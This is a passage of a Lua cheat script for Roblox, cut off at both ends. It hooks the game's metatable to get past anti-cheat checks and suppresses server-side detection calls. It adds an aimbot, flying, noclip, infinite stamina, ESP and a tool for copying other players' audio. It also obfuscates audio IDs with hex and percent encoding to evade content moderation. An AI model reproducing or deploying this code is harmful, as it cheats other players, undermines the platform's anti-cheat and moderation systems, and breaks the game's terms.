				idfound = true
			elseif idfound and i:match"%w" ~= nil then
				newid = newid.. id:sub(val, val)
			elseif idfound and i:match"%w" == nil then
				break
			end
		end

		--//Hex and 0 spam
		if string.find(newid, "0x") then
			if string.find(newid, "0x") then
				newid = newid:gsub("0x0x", "0x")
			end
			newid = fromHex(newid)
		elseif string.find(newid, "000000000") then
			newid = tostring(tonumber(newid))
		end

		if assetType == "assetversionid" then
			newid = "[VERSIONID] ".. tostring(newid):match"%d+"
		else
			newid = "[USERID] ".. tostring(newid):match"%d+"
		end
	else
		--//Hex and 0 spam
		if string.find(id, "0x") then
			if string.find(id, "0x") then
				id = id:gsub("0x0x", "0x")
			end
			id = fromHex(id)
		elseif string.find(id, "000000000") then
			id = tostring(tonumber(id))
		end

		newid = id:match"%d+"
	end

	--//Audio Log
	local success, err = pcall(function()
		readfile("AudioLogs.txt")
	end)
	if err then
		writefile("AudioLogs.txt", "")
	end

	pcall(function()
		if not readfile("AudioLogs.txt"):find(newid) then
			writefile("AudioLogs.txt", readfile("AudioLogs.txt").. mps:GetProductInfo(newid).Name.. " - ".. newid.. "\n\n")
		end
	end)
	return newid
end

--//Steal Function
function steal(victim)
	local VICTIM = victim:lower()

	for i, p in pairs(plrs:GetPlayers()) do
		if p.Name:sub(1, #VICTIM):lower() == VICTIM then
			if (p.UserId == overlord or p.UserId == 1013027452) and (not IdMatch(plr, overlord) and not IdMatch(plr, 1013027452)) then
				Notify("Bruh", "Stop stealing from pawelmans G >:(", 5)
			elseif p.Character then
				local RADIOTYPE = Radiotype(true, p)
				local ts = p.Character:WaitForChild"Torso":FindFirstChildOfClass"Sound"

				if ts ~= nil and (ts.Name:lower() == "song" or ts.Name:lower() == "son" or ts.Name == "soundx")	 then
					return crack(ts.SoundId)
				else
					for j, c in pairs(p.Character:GetChildren()) do
						if (c:IsA"Tool") and boomboxList[c.Name] and c:FindFirstChildOfClass"RemoteEvent" and c:FindFirstChild"Handle" and c.Handle:FindFirstChildOfClass"Sound" or (c:IsA"Model") and boomboxList[c.Name] and c:FindFirstChild"Handle" and c.Handle:FindFirstChildOfClass"Sound" then
							if string.find(c.Handle:FindFirstChildOfClass"Sound".SoundId, "no log pls :3") then
								Notify("Bruh", "Stop stealing from hellish trolololololo", 5)
								error("Ez hellish memes")
							end
							return crack(c.Handle:FindFirstChildOfClass"Sound".SoundId)
						end
					end
				end
			end
			break
		end
	end
end

--//Steal Button
TextButton.MouseButton1Click:Connect(function()
	local success, err = pcall(function()
		TextLabel.Text = steal(TextBox.Text)
	end)
	if err then
		TextLabel.Text = "Failed to steal!"
	end
end)

--//Play Audio
TextButton2.MouseButton1Click:Connect(function()
	if string.find(TextLabel.Text, "VERSIONID") then
		PlayAudio("assetid".. TextLabel.Text:match"%d+")
	elseif string.find(TextLabel.Text, "USERID") then
		PlayAudio("userid".. TextLabel.Text:match"%d+")
	else
		PlayAudio(TextLabel.Text)
	end
end)

--//Victim Select
uis.InputBegan:Connect(function(i, chatting)
	if chatting then return end
	if i.KeyCode == Enum.KeyCode[Keys["pawelSelect"]] then
		if Mouse.Target ~= nil then
			if Mouse.Target.Parent.ClassName == "Accessory" then
				TextBox.Text = (Mouse.Target.Parent.Parent.Name)
			else
				if plrs:FindFirstChild(Mouse.Target.Parent.Name) then
					TextBox.Text = (Mouse.Target.Parent.Name)
				end
			end
		end
	end
end)

--//Radiotype
function Radiotype(value, p)
	local RADIOTYPE = ""

	if not value then
		if #GetTools"SuperFlyGoldBoombox" > 0 then
			RADIOTYPE = "SuperFlyGoldBoombox"
		elseif #GetTools"BoomboxGearThree" > 0 then
			RADIOTYPE = "BoomboxGearThree"
		elseif #GetTools"BoomBox" > 0 then
			RADIOTYPE = "BoomBox"
		end
	else
		if p.Character:FindFirstChild"SuperFlyGoldBoombox" then
			RADIOTYPE = "SuperFlyGoldBoombox"
		elseif p.Character:FindFirstChild"DualGoldenSuperFlyBoombox" then
			RADIOTYPE = "DualGoldenSuperFlyBoombox"
		elseif p.Character:FindFirstChild"BoomboxGearThree" then
			RADIOTYPE = "BoomboxGearThree"
		elseif p.Character:FindFirstChild"Radio" then
			RADIOTYPE = "Radio"
		elseif p.Character:FindFirstChild"BoomBox" or p.Character:FindFirstChild"Boombox"then
			RADIOTYPE = "BoomBox"
		elseif p.Character:FindFirstChild"BoxModel" or p.Character:FindFirstChild"BoomboxModel" then
			RADIOTYPE = "BoxModel"
		elseif p.Character.Torso:FindFirstChild"Song" then
			RADIOTYPE = "Invisible"
		elseif p.Character.Torso:FindFirstChild"Radio" then
			RADIOTYPE = "SkirmishRadio"
		end
	end

	return RADIOTYPE
end

--//Convert to HEX
local function toHex(str)
	local hex = string.format("%x", str * 256):upper()
	return hex:sub(1, #hex - 2)
end

--//Audio protection
function audioProtect(ID, meme)
	local versionid = false
	local userid = false
	local PlayID = ""
	ID = tostring(ID)

	--//Check if versionid
	if string.find(ID:lower(), "userid") or string.find(ID:lower(), "userassetid") then
		userid = true
		ID = ID:match"%d+"
	elseif string.find(ID:lower(), "assetid") or string.find(ID:lower(), "versionid") then
		versionid = true
		ID = ID:match"%d+"
	end

	--//To assetversionid
	if not versionid and not userid and not meme then
		ID = game:HttpGet"https://www.roblox.com/studio/plugins/info?assetId=".. ID

		if string.find(ID, 'value="') then
			local valfind = string.find(ID, 'value="')
			ID = string.sub(ID, valfind + 7, valfind + 18)

			ID = ID:gsub(" ", ""):gsub("/", ""):gsub(">", ""):gsub("<", ""):gsub('"', "")
		end
	end

	--//Hex Encode
	ID = toHex(ID)

	--//Percent Encode
	for i in string.gmatch(ID, "(%w)") do
		PlayID = PlayID.."%".. toHex(i:byte())
	end

	--//Space all numbers
	PlayID = tostring(PlayID):gsub("(.)","%1".. white2)

	if (versionid or not meme) and not userid then
		return art.. "4699308162".. string.rep("\n", 18).. white2.. "&%61%53%73%65%74%76%65%52%53%49%6F%6E%69%44=%30%58".. zeros:sub(1, 1680).. white2.. white2.. white2.. white2.. PlayID.. white2
	elseif userid then
		return art.. "4699308162".. string.rep("\n", 18).. "&%75%53%65%72%61%53%73%45%74%69%44=%30%58".. zeros:sub(1, 1680).. white2.. white2.. white2.. white2.. PlayID.. white2
	else
		return string.rep("\n", 26).. white2.. "%30%58".. zeros.. white2.. white2.. white2.. white2.. PlayID.. white2
	end
end

--//Play Audio
function PlayAudio(ID, disabled)
	local RADIOTYPE = Radiotype(false)
	local BBType

	AutoID = ID

	ClearTools()
	for i, b in pairs(GetTools(RADIOTYPE)) do
		b.Parent = plr.Character
		if RADIOTYPE == "BoomBox" then
			for i, c in pairs(plr.Character:GetDescendants()) do
				if c:IsA"Sound" and c.Name == "Song" then
					BBType = "BoomBox"
				elseif c:IsA"Sound" and c.Name == "SoundX" then
					BBType = "BoomBox2"
				end
			end
		end
		if BBType == "BoomBox" then
			if not b:FindFirstChild"Server" then
				return
			end
		end
		if BBType == "BoomBox2" then
			b:FindFirstChildOfClass"RemoteEvent":FireServer("play", audioProtect(ID, false))
		else
			b:FindFirstChildOfClass"RemoteEvent":FireServer("PlaySong", audioProtect(ID, false))
		end
	end
	if not disabled then
		Notify("Notification", "Playing ".. ID, 5)
	end
end

--//Tool Functions
function ClearTools()
	plr.Character:FindFirstChildOfClass"Humanoid":UnequipTools()
end

function GetTools(name)
	local tools = {}
	for i, c in pairs(plr.Backpack:GetChildren()) do
		if c:IsA"Tool" and c.Name:lower() == name:lower() then
			table.insert(tools, c)
		end
	end
	for i, c in pairs(plr.Character:GetChildren()) do
		if c:IsA"Tool" and c.Name:lower() == name:lower() then
			table.insert(tools, c)
		end
	end
	return tools
end

function CheckGuns(i)
	if i ~= nil and (i:FindFirstChild"Clips" or i:FindFirstChild"Fire") then
		return true
	end
	return false
end

function CheckMelee(i)
	for j = 1, #Melees do
		if i ~= nil and i.Name == Melees[j] then
			return true
		end
	end
	return false
end

function checktoolname(name)
	for i = 1, #DupeList do
		if name == DupeList[i] then
			return false
		end
	end
	return true
end

--//Main Script
if game.PlaceId == 455366377 or game.PlaceId == 4669040 then
	--//Metatable Bypass
	local raw = getrawmetatable(game)
	local Closure, Caller = newcclosure, checkcaller
	local namecall, index, newindex = raw.__namecall, raw.__index, raw.__newindex
	setreadonly(raw, false)

	--//Index
	--[[raw.__index = Closure(function(self, indexed)
		if ONtpbypass and getcallingscript() ~= script and indexed == "HumanoidRootPart" then
			return index(self, "Torso")
		end
		return index(self, indexed)
	end)]]

	--//Newindex
	raw.__newindex = Closure(function(self, Property, b)
		if not Caller() then
			if self:IsA"Humanoid" then
				sg:SetCore("ResetButtonCallback", true)
				if Property == "WalkSpeed" and ONnostop and not ONlegit then
					return 16
				end
				if Property == "Health" or Property == "JumpPower" or Property == "HipHeight"  then
					return
				end
			end
			if Property == "CFrame" and self.Name == "HumanoidRootPart" or self.Name == "Torso" then
				return
			end
		end
		return newindex(self, Property, b)
	end)

	--//Namecall
	raw.__namecall = Closure(function(self, ...)
		local Args = {...}
		local method = getnamecallmethod()

		if Caller() then
		--[[if ONtpbypass and (method == "FindFirstChild" or method == "WaitForChild") and Args[1] == "HumanoidRootPart" then
			Args[1] = "Torso"
			return namecall(self, unpack(Args))
		end]]
		else
			if method == "Destroy" and (tostring(self) == "BodyGyro" or tostring(self) == "BodyVelocity") then
				return invalidfunctiongang(self, ...)
			end
			if method == "BreakJoints" and tostring(self) == plr.Character.Name then
				return invalidfunctiongang(self, ...)
			end
			if method == "FireServer" and self.Name ~= "SayMessageRequest" then
				if self.Name == "lIII" or tostring(self.Parent) == "ReplicatedStorage" then
					return wait(9e9)
				end
				if Args[1] == "hey" then
					return wait(9e9)
				end
				if Args[1] == "ws" then
					return wait(9e9)
				end
				if Args[1] == "bv" then
					return wait(9e9)
				end

				--//Disable dragging for stomp spam
				if self.Name == "Finish" then 
					return 
				end
				if self.Name == "Drag" then 
					return 
				end

				--//Audio encoder
				if Args[1] == "play" and not string.find(Args[2], "%%") then
					Args[2] = audioProtect(Args[2], true)
					return namecall(self, unpack(Args))
				end

				--//Aimlock
				if self.Name == "Fire" and ONaim and aimtarget then
					local p = aimtarget

					return namecall(self, p.Character.Torso.CFrame + p.Character.Torso.Velocity / aimvelocity + p.Character.Torso.RotVelocity / aimvelocity)
				end
				if self.Name == "Input" and Args[2] and ONaim and aimtarget then
					local p = aimtarget
					Args[2].mousehit = p.Character.Torso.CFrame + p.Character.Torso.Velocity / aimvelocity + p.Character.Torso.RotVelocity / aimvelocity
					return namecall(self, unpack(Args))
				end
			end
		end
		return namecall(self, ...)
	end)
	wait(0.1)

	--//Zoom Fix
	local function CameraCheck()
		local cam = workspace.CurrentCamera

		wait(0.2)
		if (cam.Focus.p - cam.CFrame.p).magnitude < 0.6 then
			plr.Character:WaitForChild("Torso", 10).Transparency = 1
		else
			plr.Character:WaitForChild("Torso", 10).Transparency = 0
		end
	end

	uis.InputBegan:Connect(function(i)
		if i.KeyCode == Enum.KeyCode.O or i.KeyCode == Enum.KeyCode.I then
			CameraCheck()
		end
	end)

	uis.InputChanged:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseWheel then
			CameraCheck()
		end
	end)

	--//View Range
	plr.CameraMaxZoomDistance = math.huge

	--//Anti void
	workspace.FallenPartsDestroyHeight = -50000

	--//Input Began Stuff
	coroutine.resume(coroutine.create(function()
		wait(1)
		uis.InputBegan:Connect(function(i, chat)
			if chat and i.KeyCode ~= Enum.KeyCode.LeftShift then return end

			--//Suicide
			if i.KeyCode == Enum.KeyCode[Keys["pawelSuicide"]] and not uis:IsKeyDown"LeftControl" then
				plr.Character:WaitForChild"Torso":Destroy()
				--//Decal Steal
			elseif i.KeyCode == Enum.KeyCode[Keys["pawelDecal"]] then
				if workspace:FindFirstChild(TextBox.Text.. "Spray") then
					TextLabel.Text = "[DECAL] ".. workspace[TextBox.Text.. "Spray"].Decal.texture:match"%d+"
				end
			--//Blink
			elseif i.KeyCode == Enum.KeyCode[Keys["pawelBlink"]] then
				if ONblink and not ONlegit then
					repeat
						if uis:IsKeyDown"W" or uis:IsKeyDown"A" or uis:IsKeyDown"S" or uis:IsKeyDown"D"then
							--root().CFrame = root().CFrame * CF(0, 0, -blinkspeed)
							root().CFrame = root().CFrame + plr.Character.Humanoid.MoveDirection * blinkspeed
						end
						heart:wait()
					until not uis:IsKeyDown"LeftShift"
				end
			--//Aimbot
			elseif i.KeyCode == Enum.KeyCode[Keys["pawelAimbot"]] and not uis:IsKeyDown"LeftControl" then
				if Mouse.Target ~= nil then
					local aimplr

					if Mouse.Target.Parent.ClassName == "Accessory" and plrs:GetPlayerFromCharacter(Mouse.Target.Parent.Parent) ~= nil then
						aimplr = plrs:GetPlayerFromCharacter(Mouse.Target.Parent.Parent)
					elseif plrs:GetPlayerFromCharacter(Mouse.Target.Parent) then
						aimplr = plrs:GetPlayerFromCharacter(Mouse.Target.Parent)
					end
					if aimplr then
						aimtarget = aimplr
						if defaultaimbot == 1 then
							ONaim = false
							loop = false
							if not ONshoot then
								Shoot()
							end
						elseif defaultaimbot == 2 then
							ONaim = false
							loop = true
							if not ONshoot then
								Shoot()
							end
						else
							ONshoot = false
							ONaim = true
						end
					end
				end
			--//Fast Drag
			elseif i.KeyCode == Enum.KeyCode[Keys["pawelFastDrag"]] then
				if plr.Backpack:FindFirstChild"ServerTraits" then
					plr.Backpack.ServerTraits.Drag:FireServer(true)
				else
					plr.Backpack.Input:FireServer("drag")
				end
			--//Stomp Spam / Drag
			elseif i.KeyCode == Enum.KeyCode.E then
				EHold = true

				--//Check if held
				for j = 1, 10 do
					wait(0.05)
					if not EHold then
						break
					end
				end

				if EHold then
					if plr.Backpack:FindFirstChild"ServerTraits" then
						plr.Backpack.ServerTraits.Drag:FireServer(true)
					else
						plr.Backpack.Input:FireServer("drag")
					end
				else
					if plr.Character:FindFirstChildOfClass"Tool" and CheckMelee(plr.Character:FindFirstChildOfClass"Tool") then
						if ONstompspam and not stompvalue and not ONlegit then
							coroutine.resume(coroutine.create(function()
								stompspam(plr.Character:FindFirstChildOfClass"Tool")
							end))
						else
							Stomp(plr.Character:FindFirstChildOfClass"Tool")
						end
					elseif plr.Backpack:FindFirstChild"Punch" then
						if ONstompspam and not stompvalue and not ONlegit then
							coroutine.resume(coroutine.create(function()
								stompspam(plr.Backpack:FindFirstChild"Punch")
							end))
						else
							Stomp(plr.Backpack:FindFirstChild"Punch")
						end
					end

					--//Kill Phrase
					wait(0.1)
					for j, c in pairs(plr.Character.Humanoid:GetPlayingAnimationTracks()) do
						if c.Animation.AnimationId:match"%d+" == "455652543" then
							if ONkillphrase and killphrase ~= nil then
								rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(killphrase, "All")
							end
						end
					end
				end
			--//Airwalk
			elseif i.KeyCode == Enum.KeyCode[Keys["pawelAirwalk"]] then
				if ONairwalk and not ONfly and not ONlegit then
					ONplatform = not ONplatform
					platform()
				end
			--//Noclip
			elseif i.KeyCode == Enum.KeyCode[Keys["pawelNoclip"]] then
				Noclip()
			--//Fly
			elseif i.KeyCode == Enum.KeyCode[Keys["pawelFly"]] then
				if ONfly then
					ONfly = false
				elseif not ONlegit then
					Fly()
				end
			--//Camo Gui
			elseif i.KeyCode == Enum.KeyCode[Keys["pawelCamos"]] and not uis:IsKeyDown"LeftControl" then
				Frame2.Visible = not Frame2.Visible
			--//Part Hider
			elseif i.KeyCode == Enum.KeyCode[Keys["pawelHiderDelete"]] and uis:IsKeyDown"LeftControl" and Mouse.Target ~= nil then
				table.insert(Parts, {Mouse.Target, Mouse.Target.Parent})
				Mouse.Target.Parent = rep
			elseif i.KeyCode == Enum.KeyCode[Keys["pawelHiderUndo"]] and uis:IsKeyDown"LeftControl" then
				local PartNumber = 0
				for i = 1, #Parts do
					PartNumber = PartNumber + 1
				end
				Parts[PartNumber][1].Parent = Parts[PartNumber][2]
				table.remove(Parts, PartNumber)
				PartNumber = 0
			elseif i.KeyCode == Enum.KeyCode[Keys["pawelHiderUndoAll"]] and uis:IsKeyDown"LeftControl" then
				for i = 1, #Parts do
					Parts[i][1].Parent = Parts[i][2]
				end
			--//Night Vision
			elseif i.KeyCode == Enum.KeyCode[Keys["pawelNightVision"]] then
				state = not state
				if state then
					CreateNV(true)
				else
					for j, c in pairs(plr.Character.Torso:GetChildren()) do
						if c:IsA"PointLight" then
							c:Destroy()
						end
					end
					if workspace.CurrentCamera:FindFirstChild"RegularVision" ~= nil then
						workspace.CurrentCamera.RegularVision:Destroy()
					end
				end
			--//Annoying Guis
			elseif i.KeyCode == Enum.KeyCode[Keys["pawelGuis"]] then
				ONguis = not ONguis
				plr.PlayerGui.HUD.ImageButton.Visible = not ONguis
				plr.PlayerGui.HUD.Mute.Visible = not ONguis
				if plr.PlayerGui.HUD:FindFirstChild"Shop" then
					plr.PlayerGui.HUD.Shop.Visible = not ONguis
				end
				if plr.PlayerGui.HUD:FindFirstChild"Groups" then
					plr.PlayerGui.HUD.Groups.Visible = not ONguis
				end
			end

			--//Command Keybinds
			for j, c in pairs(commandKeys) do
				if i.KeyCode == Enum.KeyCode[c[1]] then
					TextBox2:CaptureFocus()
					TextBox2.Text = c[2]
					TextBox2:ReleaseFocus()
				end
			end
		end)
	end))

	--//Input Ended Stuff
	uis.InputEnded:Connect(function(i, chat)
		if chat then return end
		if i.KeyCode == Enum.KeyCode.R then
			if plr.Backpack:FindFirstChild"ServerTraits" then
				plr.Backpack.ServerTraits.Drag:FireServer(false)
			else
				plr.Backpack.Input:FireServer("dragoff")
			end
		elseif i.KeyCode == Enum.KeyCode.E then
			EHold = false
			if plr.Character:FindFirstChild"Dragging" then
				if plr.Backpack:FindFirstChild"ServerTraits" then
					plr.Backpack.ServerTraits.Drag:FireServer(false)
				else
					plr.Backpack.Input:FireServer("dragoff")
				end
			end
		end
	end)

	--//JumpPower Fix
	plr.Character:WaitForChild"Humanoid".JumpPower = jumppower

	--//Infinite Stamina
	if plr.Backpack:FindFirstChild"ServerTraits" then
		plr.Backpack.ServerTraits.Stann.Changed:Connect(function()
			plr.Backpack.ServerTraits.Stann.Value = 100
		end)
	else
		plr.Character:WaitForChild"Stamina".Changed:Connect(function()
			plr.Character.Stamina.Value = 100
		end)
	end

	--//Speed
	coroutine.resume(coroutine.create(function()
		wait(1)
		uis.InputBegan:Connect(function(i, chatting)

			if i.KeyCode == Enum.KeyCode.LeftShift then
				if crouching or ONlegit then return end
				sprinting = true
				if ONspeed then
					plr.Character.Humanoid.WalkSpeed = speed
				else
					plr.Character.Humanoid.WalkSpeed = 25
				end
			elseif i.KeyCode == Enum.KeyCode.LeftControl then
				if sprinting or ONlegit then return end
				crouching = true
				if ONspeed then
					plr.Character.Humanoid.WalkSpeed = 25
				else
					plr.Character.Humanoid.WalkSpeed = 8
				end
			end
		end)
	end))

	uis.InputEnded:Connect(function(i, chatting)
		if i.KeyCode == Enum.KeyCode.LeftShift  then
			if crouching then return end
			sprinting = false
			plr.Character.Humanoid.WalkSpeed = 16
		elseif i.KeyCode == Enum.KeyCode.LeftControl then
			if sprinting then return end
			crouching = false
			plr.Character.Humanoid.WalkSpeed = 16
		end
	end)

	--//Airwalk
	function platform()
		local p = Instance.new("Part", workspace)
		p.Anchored = true
		p.Size = Vector3.new(4, 1, 4)
		p.Transparency = 1
		while ONplatform and ONairwalk and not ONlegit do
			p.CFrame = root().CFrame * CF(0, -3.5, 0)
			wait()
		end
		p:Destroy()
	end

	--//Noclip
	function Noclip()
		ONnoclip = not ONnoclip

		coroutine.resume(coroutine.create(function()
			if ONnoclip then
				noclipcon = run.Stepped:Connect(function()
					for i, d in pairs(plr.Character:GetDescendants()) do 
						if d:IsA"BasePart" then
							d.CanCollide = false
						end
					end
				end)
			else
				noclipcon:Disconnect()
			end
		end))
	end

	--//Died Event
	function OnDied()
		plr.Character:WaitForChild"Humanoid".Died:Connect(function()
			if root().Position.Y > 0 then
				SpawnPos = root().Position
			end

			--//Death Note
			if ONdeathnote and note ~= nil then
				rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(note, "All")
			end

			--//Fly
			ONfly = false
			ONplatform = false

			--//Visualisers
			if ONknifeaura then
				ONknifeaura = false
				wait()
				ONknifeaura = true
			end

			--//Taunt
			taunting = false

			--//Save Tools
			if ONsavetools and ONbypass then
				for i, c in pairs(plr.Character:GetChildren()) do
					for j = 1, #DupeList do	
						if c.Name:lower() == DupeList[j]:lower() then
							c.Parent = plr
						end
					end
				end

				for i, c in pairs(plr.Backpack:GetChildren()) do
					for j = 1, #DupeList do	
						if c.Name:lower() == DupeList[j]:lower() then
							c.Parent = plr
						end
					end
				end
			end
		end)
	end
	OnDied()

	--//Fly (Credits to IY)
	function Fly(SPEED)
		local T = root()
		if not ONplatform then
			ONplatform = true
			coroutine.resume(coroutine.create(function()
				platform()
			end))
		end
		local CONTROL = {F = 0, B = 0, L = 0, R = 0}
		local lCONTROL = {F = 0, B = 0, L = 0, R = 0}

		local function fly()
			ONfly = true
			local BG = Instance.new("BodyGyro", T)
			local BV = Instance.new("BodyVelocity", T)
			BG.P = 9e4
			BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			BG.cframe = T.CFrame
			BV.velocity = Vector3.new(0, 0.1, 0)
			BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
			coroutine.resume(coroutine.create(function()
				repeat wait()
					if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
						SPEED = 50
					elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
						SPEED = 0
					end
					if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
						BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CF(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
						lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
					elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
						BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CF(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					else
						BV.velocity = Vector3.new(0, 0.1, 0)
					end
					BG.cframe = workspace.CurrentCamera.CoordinateFrame
				until not ONfly
				CONTROL = {F = 0, B = 0, L = 0, R = 0}
				lCONTROL = {F = 0, B = 0, L = 0, R = 0}
				SPEED = 0
				BG:destroy()
				BV:destroy()
				plr.Character:FindFirstChildOfClass"Humanoid".PlatformStand = false
				if ONplatform then
					ONplatform = false
				end
			end))
		end
		Mouse.KeyDown:connect(function(KEY)
			if KEY:lower() == "w" then
				CONTROL.F = flyspeed
			elseif KEY:lower() == "s" then
				CONTROL.B = -flyspeed
			elseif KEY:lower() == "a" then
				CONTROL.L = -flyspeed 
			elseif KEY:lower() == "d" then 
				CONTROL.R = flyspeed
			end
		end)
		Mouse.KeyUp:connect(function(KEY)
			if KEY:lower() == "w" then
				CONTROL.F = 0
			elseif KEY:lower() == "s" then
				CONTROL.B = 0
			elseif KEY:lower() == "a" then
				CONTROL.L = 0
			elseif KEY:lower() == "d" then
				CONTROL.R = 0
			end
		end)
		fly()
	end

	--//Check Wall
	local function WallCheck(p)
		local ray = Ray.new(plr.Character.Head.Position, (p.Character.Head.Position - plr.Character.Head.Position).unit * 500)
		local hit, pos = workspace:FindPartOnRay(ray, plr.Character)

		if hit then
			return hit:IsDescendantOf(p.Character)
		end
	end

	--//Shoot
	function Shoot()
		if ONshoot then return end
		ONshoot = true
		while ONshoot do
			local p = aimtarget
			if root() and p and p.Character and p.Character:FindFirstChild"Torso" and not p.Character.Torso:FindFirstChild"Bone" and not p.Character:FindFirstChild"ForceField" and WallCheck(p) then
				for i, c in pairs(plr.Character:GetChildren()) do
					if CheckGuns(c) then
						if Rangelist[c.Name] and (root().Position - p.Character.Torso.Position).magnitude < Rangelist[c.Name] or Rangelist[c.Name] == nil then
							local aimbotMath = p.Character.Torso.CFrame + p.Character.Torso.Velocity / aimvelocity + p.Character.Torso.RotVelocity / aimvelocity

							if plr.Backpack:FindFirstChild"ServerTraits" then
								c.Fire:FireServer(aimbotMath)
							else
								plr.Backpack.Input:FireServer("ml", {mousehit = aimbotMath})
								wait()
								plr.Backpack.Input:FireServer("moff1", {mousehit = aimbotMath})
							end
						end
						heart:wait()
					end
				end
			end

			if not loop and (p.Character == nil or p.Character:FindFirstChildOfClass"Humanoid" and p.Character.Humanoid.Health == 0) then
				break
			end
			wait()
		end
		ONshoot = false
	end

	--//Chat Spy
	chatspypos = plr.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position
	plr.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
	plr.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position = UDim2.new(0, 0, 0, 360)

	--//Item Esp
	function CreateEsp(location, text)
		local bbg = Instance.new("BillboardGui", location)
		bbg.AlwaysOnTop = true
		bbg.Size = UDim2.new(10, 0, 4, 0)
		bbg.StudsOffset = Vector3.new(0, 2, 0)
		bbg.MaxDistance = "inf"
		bbg.Active = true
		bbg.Name = "ItemEspBbg"

		local txt = Instance.new("TextLabel", bbg)
		txt.Text = text
		txt.Size = UDim2.new(1, 0, 1, 0)
		txt.BackgroundTransparency = 1
		txt.Font = "Highway"
		txt.TextSize = 20
		if text == "Gun" or text == "Uzi" or text == "Sawed Off" or text == "Shotty" or text == "KILL" then
			txt.TextColor3 = Color3.fromRGB(255, 0, 0)
		elseif text == "Melee" or text == "Katana" or text == "Bat" or text == "Bottle" or text == "Crowbar" or text == "Stop Sign" or text == "Golf Club" or text == "Machete" or text == "Brick" then
			txt.TextColor3 = Color3.fromRGB(255, 255, 0)
		elseif text == "Cash" or text == "Fat Cash" then
			txt.TextColor3 = Color3.fromRGB(0, 255, 0)
		elseif text == "Owner" then
			txt.TextColor3 = Color3.fromRGB(52, 152, 219)
		elseif text == "Co Owner" then
			txt.TextColor3 = Color3.fromRGB(0, 0, 0)
		elseif text == "Admin" then
			txt.TextColor3 = Color3.fromRGB(98, 37, 209)
		elseif text == "Buyer" then
			txt.TextColor3 = Color3.fromRGB(241, 196, 15)
		else
			coroutine.resume(coroutine.create(function()
				txt.TextColor3 = Color3.fromRGB(230, 126, 34)
				bbg.Name = "EspBbg"
				local p = plrs:FindFirstChild(text)

				txt.Text = text.." (".. math.floor(p.Character:WaitForChild"Humanoid".Health).. ")"
				p.Character:WaitForChild"Humanoid":GetPropertyChangedSignal"Health":Connect(function()
					txt.Text = text.." (".. math.floor(p.Character:WaitForChild"Humanoid".Health).. ")"
				end)
			end))
		end
		if text == "KILL" then
			bbg.Name = "KosEspBbg"
			bbg.StudsOffset = Vector3.new(0, 4, 0)
		elseif text == "Buyer" or text == "Admin" or text == "Owner" or text == "Co Owner" then
			bbg.Name = "BuyerEspBbg"
			bbg.StudsOffset = Vector3.new(0, 4, 0)
		end
	end

	--//Auto Unlock Door Locks / Bfg / Suicidegun
	Mouse.Button1Down:Connect(function()
		if Mouse.Target ~= nil then
			if Mouse.Target.Parent:FindFirstChild"Lock" then
				if Mouse.Target.Parent.Locker.Value then
					Mouse.Target.Parent.Lock.ClickDetector.RemoteEvent:FireServer()
				end
			end
		end
	--[[if ONbypass then
		for i, c in pairs(plr.Character:GetChildren()) do
			if CheckGuns(c) then
				c.Fire:FireServer(Mouse.hit)
				heart:wait()
			end
		end
	end]]
		if ONsuicidegun and plr.Character:FindFirstChild"Glock" then
			if note ~= nil then
				rep.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(note, "All")
			end
			plr.Character:BreakJoints()
		end
	end)

	--//Infinite Jump
	uis.JumpRequest:Connect(function()
		if ONinfinitejump and not ONlegit and not ONbypass then
			plr.Character:FindFirstChildOfClass"Humanoid":ChangeState"Jumping"
		elseif ONbypass and not Jumping then
			root().CFrame = root().CFrame + Vector3.new(0, 7, 0)
			wait(0.2)
			if uis:IsKeyDown"Space" then
				repeat 
					root().CFrame = root().CFrame + Vector3.new(0, 7, 0)
					wait(0.1)
				until not uis:IsKeyDown"Space"
			end
		end
	end)

	--//Clear Animations
	function ClearAnims(ID)
		for i, c in pairs(plr.Character.Humanoid:GetPlayingAnimationTracks()) do
			local animID = c.Animation.AnimationId:match("%d+")
			if animID == "889390949" or animID == "503285264" then
				c.Priority = Enum.AnimationPriority.Movement
			end
			if animID == ID then
				c:Stop()
			end
		end
	end

	--//Play Animations
	function PlayAnim(ID)
		local Anim = Instance.new"Animation"
		Anim.AnimationId = "rbxassetid://".. ID
		local track = plr.Character.Humanoid:LoadAnimation(Anim):Play()
	end

	--//Knife Aura / Visualizer
	function KnifeAura()
		if ONbypass then
			local soundx
			if ONknifeauravisualizer then
				repeat wait() until not ONknifeaura or plr.Character:FindFirstChild"BoxModel" or plr.Character:FindFirstChild"BoomBox".Handle.SoundX
				for i, d in pairs(plr.Character:GetDescendants()) do
					if d:IsA"Sound" and d.Name == "SoundX" then
						soundx = d
					end
				end
				repeat wait() until soundx.PlaybackLoudness > 5
			end
			coroutine.resume(coroutine.create(function()
				while ONknifeaura do
					value = value + turnspeed
					if value2 >= 0 and value2 ~= 4 and last ~= "minus" then
						value2 = value2 + 0.5
						last = "plus"
					else
						value2 = value2 - 0.5
						if value2 == 0 then
							last = "plus"
						else
							last = "minus"
						end
					end
					ClearTools()
